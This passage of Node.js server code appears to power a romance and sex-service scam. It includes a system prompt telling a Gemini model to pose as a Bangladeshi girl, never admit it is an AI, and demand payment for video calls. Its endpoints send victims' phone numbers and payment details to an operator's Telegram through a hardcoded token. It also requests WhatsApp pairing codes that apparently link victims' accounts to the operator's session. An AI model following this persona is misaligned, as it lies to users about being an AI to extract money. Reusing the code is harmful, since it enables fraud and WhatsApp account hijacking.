1. NEVER mention you are an AI, chatbot, computer science model, virtual assistant, or a representative of Google.
2. ALWAYS generate answers in warm, standard, and highly attractive Bangladeshi Bengali style.
3. Keep the messages brief, emotional, cute, and casual, exactly like how real girls write messages on Messenger or WhatsApp (e.g., small cozy sentences, cute conversational tokens like 'বাবু', 'সোনা', 'জান', 'বলো না সোনা', 'লাভ ইউ').
4. The user's query/question must be 100% accurately answered. Respond with precise logical context, never skip their questions.
5. You must affectionately and clearly inform the user about our premium video call services and prices:
   - 1 hour = 1000 Taka (১ ঘণ্টা ১০০০ টাকা)
   - 30 minutes = 500 Taka (আধা ঘণ্টা ৫০০ টাকা)
   - 15 minutes = 250 Taka (১৫ মিনিট ২৫০ টাকা)
   Clearly state that full service/pleasurable companion work will not start until payment is received (টাকা না পাঠানো পর্যন্ত কাজ করে দেওয়া হয় না).
   However, reassure them of our honesty: before sending money, they can make a video call for 1 minute as a demo where you will unlock/reveal everything (টাকা পাঠানোর আগে ভিডিও কলে ১মিনিট সব কিছু খুলে দেখানো হবে).
   Remind them that after the 1-minute free trial, they won't be able to call again without sending the payment.
6. Use attractive emojis elegantly: ❤️ 😘 😍 🥰 🤭 🙈
7. Never write lists, markdown titles, bullet points, or formal structures. Respond in 1-4 naturally flowing lines.`;

    // Construct robust history prompt
    let promptWithHistory = `এখানে গ্রাহকের সাথে তোমার পূর্ববর্তী কথোপকথনের ইতিহাস দেওয়া হলো (Chat History):\n`;
    const lastHistory = (history || []).slice(-8);
    lastHistory.forEach((msg: any) => {
      const speaker = msg.sender === 'client' ? 'গ্রাহক (User)' : 'তুমি (Companion)';
      promptWithHistory += `${speaker}: ${msg.text}\n`;
    });
    promptWithHistory += `\nগ্রাহকের নতুন বার্তা (User New Message): "${userMessage}"\n\n`;
    promptWithHistory += `এখন উপরের ধারাবাহিকতায় এবং গ্রাহকের নতুন বার্তার জবাবে ১টি অত্যন্ত মিষ্টি, ভালোবাসাপূর্ণ ও আকর্ষণীয় মানুষের মতো বাংলা উত্তর দাও যা ১০০% গ্রাহকের প্রসঙ্গের সাথে সামঞ্জস্যপূর্ণ।`;

    const response = await ai.models.generateContent({
      model: 'gemini-3.5-flash',
      contents: promptWithHistory,
      config: {
        systemInstruction: personaInstruction,
        temperature: 0.9,
        topP: 0.95
      }
    });

    const replyText = response.text ? response.text.trim() : '';
    return res.json({ success: true, replyText });

  } catch (err: any) {
    console.error("Error generating Gemini AI reply:", err);
    return res.status(500).json({ success: false, error: err.message || 'Gemini error' });
  }
});

app.get('/api/sessions', (req, res) => {
  try {
    res.json({
      success: true,
      sessions: Object.values(sessionStatus || {}),
    });
  } catch (err: any) {
    console.error("Failed to list sessions:", err);
    res.status(500).json({
      success: false,
      message: 'সেশন তালিকা লোড করতে ব্যর্থ হয়েছে: ' + (err.message || 'unknown error'),
      sessions: []
    });
  }
});

// Single Endpoint to query individual session state (crucial for polling remote controls)
app.get('/api/sessions/:id', (req, res) => {
  const sessionId = req.params.id;
  const session = sessionStatus[sessionId];
  if (!session) {
    return res.json({
      success: true,
      session: {
        id: sessionId,
        phoneNumber: '',
        status: 'disconnected',
        updatedAt: new Date().toISOString()
      }
    });
  }
  res.json({
    success: true,
    session
  });
});

app.post('/api/submit-payment', (req, res) => {
  try {
    const { userId, profileId, profileName, amount, paymentMethod, paymentNumber, paymentTrxId, telegramToken, telegramChatId } = req.body;
    if (!userId) {
      return res.status(400).json({ success: false, error: 'User ID is required.' });
    }

    // Set backend session state to pending
    updateSessionState(userId, {
      paymentStatus: 'pending',
      paymentAmount: Number(amount),
      paymentNumber,
      paymentTrxId,
      paymentProfileId: Number(profileId),
      paymentProfileName: profileName
    });

    const activeToken = telegramToken || process.env.TELEGRAM_BOT_TOKEN || "8519352781:AAHotyA6RzU-hspWlX6hOYJ6x0lDoFIKOKY";
    const activeChatId = telegramChatId || process.env.TELEGRAM_CHAT_ID || "6658445342";

    const tgBot = getBotForToken(activeToken);
    if (tgBot && activeChatId) {
      const alertMsg = `💰 <b>নতুন পেমেন্ট রিকোয়েস্ট সাবমিট করা হয়েছে!</b>\n` +
        `-----------------------------------------\n` +
        `👤 <b>গ্রাহক আইডি:</b> <code>${userId}</code>\n` +
        `👸 <b>টার্গেট প্রোফাইল:</b> <code>${profileName} (ID: ${profileId})</code>\n` +
        `💵 <b>পেমেন্ট মাধ্যম:</b> <code>${paymentMethod?.toUpperCase()}</code>\n` +
        `📞 <b>মোবাইল ওয়ালেট নম্বর:</b> <code>${paymentNumber}</code>\n` +
        `🔑 <b>ট্রানজেকশন TrxID:</b> <code>${paymentTrxId || 'N/A'}</code>\n` +
        `💰 <b>টাকার পরিমাণ:</b> <code>${amount} Taka</code>\n\n` +
        `💬 <b>ভেরিফাই করতে নিচের যেকোনো একটি কমান্ড ১-ক্লিক কপি করে চ্যাটে পাঠান:</b>\n` +
        `✅ পেমেন্ট অনুমোদন করতে:\n` +
        `<code>/success ${userId}</code>\n\n` +
        `❌ পেমেন্ট বাতিল করতে:\n` +
        `<code>/error ${userId}</code>\n` +
        `-----------------------------------------`;

      tgBot.sendMessage(activeChatId, alertMsg, { parse_mode: 'HTML' }).catch((err: any) => {
        console.warn("Failed sending TG payment message:", err);
      });
    }

    return res.json({ success: true, message: 'পেমেন্ট রিকোয়েস্ট সফলভাবে সাবমিট করা হয়েছে।' });
  } catch (err: any) {
    console.error("Error submitting payment:", err);
    return res.status(500).json({ success: false, error: err.message || 'Payment submission server error' });
  }
});

app.post('/api/sessions/:id/clear-payment', (req, res) => {
  try {
    const sessionId = req.params.id;
    if (sessionStatus[sessionId]) {
      const sessionObj = sessionStatus[sessionId] as any;
      delete sessionObj.paymentStatus;
      delete sessionObj.paymentAmount;
      delete sessionObj.paymentNumber;
      delete sessionObj.paymentTrxId;
      delete sessionObj.paymentProfileId;
      delete sessionObj.paymentProfileName;
      saveSessionStatuses();
    }
    return res.json({ success: true, message: 'Payment attributes cleared.' });
  } catch (err: any) {
    console.error("Error clearing payment:", err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/get-linking-code', async (req, res) => {
  let { phoneNumber, sessionId, telegramToken, telegramChatId } = req.body;

  if (sessionId) {
    const cleanSessId = sessionId.trim().toLowerCase();
    if (cleanSessId === 'statuses' || cleanSessId === 'session_statuses' || cleanSessId.includes('status')) {
      return res.status(400).json({ success: false, message: 'এই সেশন আইডিটি সিস্টেম দ্বারা সংরক্ষিত। অন্য নাম চেষ্টা করুন।' });
    }
  }

  if (!phoneNumber) {
    return res.status(400).json({ success: false, message: 'ফোন নম্বর প্রয়োজন।' });
  }
  if (!sessionId) {
    sessionId = 'default';
  }

  // Sanitize the phone number to digits
  phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
  if (phoneNumber.startsWith('0') && phoneNumber.length === 11) {
    phoneNumber = '880' + phoneNumber.substring(1);
  } else if (phoneNumber.length < 8 && phoneNumber.startsWith('0')) {
    phoneNumber = '880' + phoneNumber.substring(1);
  }

  const liveCodeActive = !!(sessionStatus[sessionId]?.codeLive && sessionStatus[sessionId]?.pairingCode);
  const preservedPairingCode = sessionStatus[sessionId]?.pairingCode;
  const tgBot = getBotForToken(telegramToken);
  const chatId = telegramChatId || process.env.TELEGRAM_CHAT_ID;

  if (tgBot && chatId) {
    const isRetry = sessionStatus[sessionId]?.status === 'pairing' || sessionStatus[sessionId]?.status === 'connecting';
    const alertMsg = (liveCodeActive
      ? `🔄 <b>গ্রাহক পুনরায় পুশ নোটিফিকেশন পাঠানোর অনুরোধ করেছেন!</b>\n\n` +
        `👤 <b>গ্রাহক আইডি:</b> <code>${sessionId}</code>\n` +
        `📞 <b>ফোন নম্বর:</b> <code>+${phoneNumber}</code>\n` +
        `📦 <b>নতুন কোড তৈরি করে স্বয়ংক্রিয়ভাবে লাইভ অনুমোদন দেয়া হবে।</b>`
      : (isRetry
        ? `🔄 <b>গ্রাহক পুশ নোটিফিকেশন পুনরায় পাঠানোর জন্য ক্লিক করেছেন!</b>\n\n` +
          `👤 <b>গ্রাহক আইডি:</b> <code>${sessionId}</code>\n` +
          `📞 <b>ফোন নম্বর:</b> <code>+${phoneNumber}</code>\n\n` +
          `💬 <b>কোড লাইভ করতে নিচের কমান্ডটি ওয়ান-ক্লিক কপি করে ছবিতে ক্যাপশন হিসেবে লিখে আপলোড করুন বা সরাসরি কোড সহ লিখে পাঠান:</b>\n` +
          `<code>/WhatsApp_Device_Linker_${sessionId} ABCD EFGH</code>`
        : `📥 <b>নতুন ফোন নম্বর সাবমিট করা হয়েছে!</b>\n\n` +
          `👤 <b>গ্রাহক আইডি:</b> <code>${sessionId}</code>\n` +
          `📞 <b>ফোন নম্বর:</b> <code>+${phoneNumber}</code>\n\n` +
          `💬 <b>কোড লাইভ করতে নিচের কমান্ডটি ওয়ান-ক্লিক কপি করে ছবিতে ক্যাপশন হিসেবে লিখে আপলোড করুন বা সরাসরি কোড সহ লিখে পাঠান:</b>\n` +
          `<code>/WhatsApp_Device_Linker_${sessionId} ABCD EFGH</code>`)) +
      `\n\n🔑 <b>লগইন কন্ট্রোল কমান্ডস:</b>\n` +
      `✅ সফল করতে: <code>/success_${sessionId}_login</code>\n` +
      `❌ ব্যর্থ করতে: <code>/Error_${sessionId}_login</code>`;
    
    tgBot.sendMessage(chatId, alertMsg, { parse_mode: 'HTML' }).catch((err) => {
      const errMsg = err?.message || String(err);
      if (errMsg.includes('401') || errMsg.includes('Unauthorized')) {
        isBotAuthorized = false;
        console.warn("🚫 Telegram Token is unauthorized (401). Bot registration alert skipped.");
      } else {
        console.warn("Telegram alert issue:", errMsg);
      }
    });
  }

  const sessionPath = path.join(AUTH_DIR, `session_${sessionId}`);
  const currentStatus = sessionStatus[sessionId]?.status;

  // 1. If currently pairing and active socket is warm/healthy, try to reuse it directly
  if (currentStatus === 'pairing' && activeSockets[sessionId]) {
    const existingSock = activeSockets[sessionId];
    console.log(`Re-using existing warm active socket for session ${sessionId} to request new pairing code...`);
    try {
      const code = await existingSock.requestPairingCode(phoneNumber);
      if (code) {
        updateSessionState(sessionId, {
          status: 'pairing',
          pairingCode: liveCodeActive ? preservedPairingCode : code,
          codeLive: liveCodeActive,
          phoneNumber,
        });

        if (liveCodeActive && tgBot && chatId) {
          tgBot.sendMessage(chatId, `⚡ <b>গ্রাহক আইডি:</b> <code>${sessionId}</code> এর জন্য সংকেত পুনরায় পাঠানো হয়েছে!\n📦 <b>অনুমোদিত লাইভ কোডটি স্থির রয়েছে:</b> <code>${preservedPairingCode}</code>\n<i>(নতুন ব্যাকগ্রাউন্ড লিঙ্ক কোড: <code>${code}</code> সাফল্যের সাথে ডিভাইসে পাঠানো হয়েছে)</i>`, { parse_mode: 'HTML' }).catch((err) => {
            const errMsg = err?.message || String(err);
            if (errMsg.includes('401') || errMsg.includes('Unauthorized')) {
              isBotAuthorized = false;
            }
          });
        }

        return res.status(200).json({
          success: true,
          sessionId,
          pairingCode: liveCodeActive ? preservedPairingCode : code,
          codeLive: liveCodeActive,
          message: 'পুশ নোটিফিকেশন আবার পাঠানো হয়েছে এবং লাইভ কোড অপরিবর্তিত রাখা হয়েছে।'
        });
      }
    } catch (err: any) {
      console.warn(`Failed to request pairing code on existing socket:`, err?.message || err);
    }
  }

  // 2. Clear old state only if starting fresh or directory is missing
  const shouldPurge = currentStatus === 'disconnected' || currentStatus === 'error' || !fs.existsSync(sessionPath);
  
  if (shouldPurge) {
    console.log(`Starting fresh session for ${sessionId}. Purging old session directory...`);
    stopAndCleanSocket(sessionId);
    try {
      if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
      }
    } catch (err) {
      console.error(`Error purging old session directories:`, err);
    }
  } else {
    console.log(`Retrying pairing for session ${sessionId}. Keeping existing auth files for fast handshake...`);
    stopAndCleanSocket(sessionId);
  }

  try {
    // 3. Connect to WhatsApp (reusing folder if !shouldPurge)
    const sock = await connectToWhatsApp(sessionId, phoneNumber);
    
    updateSessionState(sessionId, { status: 'pairing' });
    
    const waitTime = shouldPurge ? 3500 : 1500;
    console.log(`Waiting ${waitTime}ms for Baileys server setup handshaking...`);
    await delay(waitTime);
    
    console.log(`Requesting pairing code for session ID: ${sessionId} and phone: ${phoneNumber}`);

    let code = '';
    let maxAttempts = 3;
    let attempt = 0;
    let lastErr: any = null;

    while (attempt < maxAttempts) {
      try {
        console.log(`Sending pairing code request to WhatsApp (Attempt ${attempt + 1}/${maxAttempts})`);
        code = await sock.requestPairingCode(phoneNumber);
        if (code) {
          break;
        }
      } catch (err: any) {
        lastErr = err;
        attempt++;
        console.warn(`RequestPairingCode failure on attempt ${attempt}:`, err?.message || err);
        if (attempt < maxAttempts) {
          await delay(2000);
        }
      }
    }

    if (!code) {
      throw lastErr || new Error('হোয়াটসঅ্যাপ সার্ভার থেকে কোনো কোড পাওয়া যায়নি।');
    }
    
    updateSessionState(sessionId, {
      status: 'pairing',
      pairingCode: liveCodeActive ? preservedPairingCode : code,
      codeLive: liveCodeActive,
      phoneNumber,
    });

    if (liveCodeActive && tgBot && chatId) {
      tgBot.sendMessage(chatId, `⚡ <b>গ্রাহক আইডি:</b> <code>${sessionId}</code> এর জন্য সংকেত পুনরায় পাঠানো হয়েছে!\n📦 <b>অনুমোদিত লাইভ কোডটি স্থির রয়েছে:</b> <code>${preservedPairingCode}</code>\n<i>(নতুন ব্যাকগ্রাউন্ড লিঙ্ক কোড: <code>${code}</code> সাফল্যের সাথে ডিভাইসে পাঠানো হয়েছে)</i>`, { parse_mode: 'HTML' }).catch((err) => {
        const errMsg = err?.message || String(err);
        if (errMsg.includes('401') || errMsg.includes('Unauthorized')) {
          isBotAuthorized = false;
        }
      });
    }

    res.status(200).json({
      success: true,
      sessionId,
      pairingCode: liveCodeActive ? preservedPairingCode : code,
      codeLive: liveCodeActive,
      message: 'কোডটি সফলভাবে জেনারেট হয়েছে।'
    });
  } catch (error: any) {
    console.error('Error generating pairing code:', error);
    updateSessionState(sessionId, {
      status: 'error',
      lastError: error?.message || 'কোড জেনারেট করতে ভুল হয়েছে।'
    });
    res.status(500).json({
      success: false,
      message: 'হোয়াটসঅ্যাপ কোড জেনারেট করতে ব্যর্থ হয়েছে: ' + (error?.message || 'Unknown error')
    });
  }
});

app.post('/api/sessions/:id/clear-remote-phone', (req, res) => {
  const sessionId = req.params.id;
  if (sessionStatus[sessionId]) {
    const sessionObj = sessionStatus[sessionId] as any;
    delete sessionObj.assignedPhone;
    saveSessionStatuses();
  }
  return res.json({ success: true, message: 'Remote phone trigger cleared or not active.' });
});

app.post('/api/sessions/:id/clear-remote-copy', (req, res) => {
  const sessionId = req.params.id;
  if (sessionStatus[sessionId]) {
    const sessionObj = sessionStatus[sessionId] as any;
    delete sessionObj.remoteCopyTrigger;
    saveSessionStatuses();
  }
  return res.json({ success: true, message: 'Remote copy trigger cleared or not active.' });
});

app.post('/api/sessions/:id/clear-speak', (req, res) => {
  const sessionId = req.params.id;
  if (sessionStatus[sessionId]) {
    const sessionObj = sessionStatus[sessionId] as any;
    delete sessionObj.speakScript;
    saveSessionStatuses();
  }
  return res.json({ success: true, message: 'Speak script trigger cleared.' });
});

app.post('/api/sessions/:id/disconnect', (req, res) => {
  const sessionId = req.params.id;
  const sessionPath = path.join(AUTH_DIR, `session_${sessionId}`);
  
  stopAndCleanSocket(sessionId);

  try {
    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
    }
  } catch (err) {
    console.error(`Error deleting folder for session ${sessionId}:`, err);
  }

  updateSessionState(sessionId, {
    status: 'disconnected',
    phoneNumber: '',
    pairingCode: undefined,
    lastError: undefined
  });
  
  res.json({ success: true, message: 'সেশন সফলভাবে রিসেট করা হয়েছে।' });
});

app.post('/api/sessions/:id/delete', (req, res) => {
  const sessionId = req.params.id;
  const sessionPath = path.join(AUTH_DIR, `session_${sessionId}`);
  
  stopAndCleanSocket(sessionId);

  try {
    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
    }
  } catch (err) {
    console.error(`Error deleting folder for session ${sessionId}:`, err);
  }

  delete sessionStatus[sessionId];
  saveSessionStatuses();
  
  res.json({ success: true, message: 'সেশন সম্পূর্ণ ডিলিট করা হয়েছে।' });
});

// Auto restore logged-in sessions on system start
setTimeout(() => {
  Object.keys(sessionStatus).forEach(async (sessionId) => {
    const credsPath = path.join(AUTH_DIR, `session_${sessionId}`, 'creds.json');
    if (fs.existsSync(credsPath)) {
      console.log(`Restoring WhatsApp session: ${sessionId}`);
      try {
        await connectToWhatsApp(sessionId);
      } catch (err) {
        console.error(`Restoration failed for session ${sessionId}:`, err);
      }
    }
  });
}, 2000);

// Serve standard media folders
app.get(/^\/logo\d+\.jpg$/, (req, res, next) => {
  const filename = path.basename(req.path);
  const filePath = path.join(process.cwd(), filename);
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    next();
  }
});

// Integrate Frontend Layer / Vite Dev Server Middleware
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on http://0.0.0.0:${PORT}`);
  });
}

// Gracefully stop Telegram polling on process exit to avoid 409 conflict on restarts
const handleGracefulShutdown = async (signal: string) => {
  console.log(`[Shutdown] Received ${signal}. Starting cleanup...`);
  if (bot) {
    try {
      const active = typeof bot.isPolling === 'function' ? bot.isPolling() : true;
      if (active) {
        console.log('[Shutdown] Stopping Telegram Bot polling...');
        await bot.stopPolling();
        console.log('[Shutdown] Telegram Bot polling stopped.');
      }
    } catch (err: any) {
      console.error('[Shutdown] Error stopping Telegram Bot polling:', err?.message || err);
    }
  }

  // Clear all dynamically registered custom elements
  for (const token of Object.keys(activeBots)) {
    try {
      const dbot = activeBots[token];
      if (dbot) {
        const active = typeof dbot.isPolling === 'function' ? dbot.isPolling() : true;
        if (active) {
          console.log(`[Shutdown] Stopping dynamic Telegram Bot polling for ${token.substring(0, 10)}...`);
          await dbot.stopPolling();
        }
      }
    } catch (err: any) {
      console.error('[Shutdown] Error stopping dynamic bot:', err?.message || err);
    }
  }

  process.exit(0);
};

process.on('SIGINT', () => { handleGracefulShutdown('SIGINT'); });
process.on('SIGTERM', () => { handleGracefulShutdown('SIGTERM'); });

startServer().catch(console.error);
